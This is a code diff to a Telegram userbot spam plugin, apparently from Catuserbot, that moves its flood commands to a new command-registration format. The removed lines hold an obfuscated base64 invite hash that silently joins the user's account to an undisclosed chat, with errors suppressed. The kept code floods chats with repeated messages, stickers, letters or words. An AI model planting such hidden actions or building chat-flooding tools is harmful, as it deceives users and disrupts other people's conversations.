@@ -5,29 +5,18 @@ from telethon.tl import functions, types
 from telethon.tl.functions.messages import GetStickerSetRequest
 from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
+from userbot import catub
+
+from ..core.managers import edit_delete, edit_or_reply
+from ..helpers.tools import media_type
+from ..helpers.utils import _catutils
 from . import BOTLOG, BOTLOG_CHATID
 
-
-@bot.on(admin_cmd(pattern="spam (.*)"))
-@bot.on(sudo_cmd(pattern="spam (.*)", allow_sudo=True))
-async def spammer(event):
-    if event.fwd_from:
-        return
-    sandy = await event.get_reply_message()
-    cat = ("".join(event.text.split(maxsplit=1)[1:])).split(" ", 1)
-    counter = int(cat[0])
-    if counter > 50:
-        sleeptimet = 0.5
-        sleeptimem = 1
-    else:
-        sleeptimet = 0.1
-        sleeptimem = 0.3
-    await event.delete()
-    await spam_function(event, sandy, cat, sleeptimem, sleeptimet)
+plugin_category = "extra"
 
 
 async def spam_function(event, sandy, cat, sleeptimem, sleeptimet, DelaySpam=False):
-    hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+    # sourcery no-metrics
     counter = int(cat[0])
     if len(cat) == 2:
         spam_message = str(cat[1])
@@ -44,16 +33,6 @@ async def spam_function(event, sandy, cat, sleeptimem, sleeptimet, DelaySpam=Fal
             )
             await _catutils.unsavegif(event, sandy)
             await asyncio.sleep(sleeptimem)
-    elif event.reply_to_msg_id and sandy.text:
-        spam_message = sandy.text
-        for _ in range(counter):
-            await event.client.send_message(event.chat_id, spam_message)
-            await asyncio.sleep(sleeptimet)
-        try:
-            hmm = Get(hmm)
-            await event.client(hmm)
-        except BaseException:
-            pass
         if BOTLOG:
             if DelaySpam is not True:
                 if event.is_private:
@@ -85,6 +64,11 @@ async def spam_function(event, sandy, cat, sleeptimem, sleeptimet, DelaySpam=Fal
             sandy = await event.client.send_file(BOTLOG_CHATID, sandy)
             await _catutils.unsavegif(event, sandy)
         return
+    elif event.reply_to_msg_id and sandy.text:
+        spam_message = sandy.text
+        for _ in range(counter):
+            await event.client.send_message(event.chat_id, spam_message)
+            await asyncio.sleep(sleeptimet)
     if BOTLOG:
         if DelaySpam is not True:
             if event.is_private:
@@ -118,11 +102,42 @@ async def spam_function(event, sandy, cat, sleeptimem, sleeptimet, DelaySpam=Fal
                 )
 
 
-@bot.on(admin_cmd(pattern="spspam$"))
-@bot.on(sudo_cmd(pattern="spspam$", allow_sudo=True))
+@catub.cat_cmd(
+    pattern="spam (.*)",
+    command=("spam", plugin_category),
+    info={
+        "header": "Floods the text in the chat !! with given number of times,",
+        "description": "Sends the replied media/message <count> times !! in the chat",
+        "usage": ["{tr}spam <count> <text>", "{tr}spam <count> reply to message"],
+        "examples": "{tr}spam 10 hi",
+    },
+)
+async def spammer(event):
+    "Floods the text in the chat !!"
+    sandy = await event.get_reply_message()
+    cat = ("".join(event.text.split(maxsplit=1)[1:])).split(" ", 1)
+    counter = int(cat[0])
+    if counter > 50:
+        sleeptimet = 0.5
+        sleeptimem = 1
+    else:
+        sleeptimet = 0.1
+        sleeptimem = 0.3
+    await event.delete()
+    await spam_function(event, sandy, cat, sleeptimem, sleeptimet)
+
+
+@catub.cat_cmd(
+    pattern="spspam$",
+    command=("spspam", plugin_category),
+    info={
+        "header": "To spam the chat with stickers.",
+        "description": "To spam chat with all stickers in that replied message sticker pack.",
+        "usage": "{tr}spspam",
+    },
+)
 async def stickerpack_spam(event):
-    if event.fwd_from:
-        return
+    "To spam the chat with stickers."
     reply = await event.get_reply_message()
     if not reply or media_type(reply) is None or media_type(reply) != "Sticker":
         return await edit_delete(
@@ -182,9 +197,18 @@ async def stickerpack_spam(event):
         await event.client.send_file(BOTLOG_CHATID, reqd_sticker_set.documents[0])
 
 
-@bot.on(admin_cmd("cspam (.*)"))
-@bot.on(sudo_cmd(pattern="cspam (.*)", allow_sudo=True))
+@catub.cat_cmd(
+    pattern="cspam (.*)",
+    command=("cspam", plugin_category),
+    info={
+        "header": "Spam the text letter by letter",
+        "description": "Spam the chat with every letter in given text as new message.",
+        "usage": "{tr}cspam <text>",
+        "examples": "{tr}cspam Catuserbot",
+    },
+)
 async def tmeme(event):
+    "Spam the text letter by letter."
     cspam = str("".join(event.text.split(maxsplit=1)[1:]))
     message = cspam.replace(" ", "")
     await event.delete()
@@ -205,9 +229,18 @@ async def tmeme(event):
             )
 
 
-@bot.on(admin_cmd("wspam (.*)"))
-@bot.on(sudo_cmd(pattern="wspam (.*)", allow_sudo=True))
+@catub.cat_cmd(
+    pattern="wspam (.*)",
+    command=("wspam", plugin_category),
+    info={
+        "header": "Spam the text word by word.",
+        "description": "Spams the chat with every word in given text asnew message.",
+        "usage": "{tr}wspam <text>",
+        "examples": "{tr}wspam I am using catuserbot",
+    },
+)
 async def tmeme(event):
+    "Spam the text word by word"
     wspam = str("".join(event.text.split(maxsplit=1)[1:]))
     message = wspam.split()
     await event.delete()
@@ -228,34 +261,24 @@ async def tmeme(event):
             )
 
 
-@bot.on(admin_cmd("delayspam (.*)"))
-@bot.on(sudo_cmd(pattern="delayspam (.*)", allow_sudo=True))
+@catub.cat_cmd(
+    pattern="(delayspam|dspam) (.*)",
+    command=("delayspam", plugin_category),
+    info={
+        "header": "To spam the chat with count number of times with given text and given delay sleep time.",
+        "description": "For example if you see this dspam 2 10 hi. Then you will send 10 hi text messages with 2 seconds gap between each message.",
+        "usage": [
+            "{tr}delayspam <delay> <count> <text>",
+            "{tr}dspam <delay> <count> <text>",
+        ],
+        "examples": ["{tr}delayspam 2 10 hi", "{tr}dspam 2 10 hi"],
+    },
+)
 async def spammer(event):
-    if event.fwd_from:
-        return
+    "To spam with custom sleep time between each message"
     reply = await event.get_reply_message()
     input_str = "".join(event.text.split(maxsplit=1)[1:]).split(" ", 2)
     sleeptimet = sleeptimem = float(input_str[0])
     cat = input_str[1:]
     await event.delete()
     await spam_function(event, reply, cat, sleeptimem, sleeptimet, DelaySpam=True)
-
-
-CMD_HELP.update(
-    {
-        "spam": "**Plugin : **`spam`\
-        \n\n**  •  Syntax : **`.spam <count> <text>`\
-        \n**  •  Function : **__ Floods text in the chat !!__\
-        \n\n**  •  Syntax : **`.spam <count> reply to media`\
-        \n**  •  Function : **__Sends the replied media <count> times !!__\
-        \n\n**  •  Syntax : **`.spspam reply to sticker`\
-        \n**  •  Function : **__spams the chat with all stickers in that pack__\
-        \n\n**  •  Syntax : **`.cspam <text>`\
-        \n**  •  Function : **__ Spam the text letter by letter.__\
-        \n\n**  •  Syntax : **`.wspam <text>`\
-        \n**  •  Function : **__ Spam the text word by word.__\
-        \n\n**  •  Syntax : **`.delayspam <delay> <count> <text>`\
-        \n**  •  Function : **__ .delayspam but with custom delay.__\
-        \n\n\n**Note : Spam at your own risk !!**"
-    }
-)
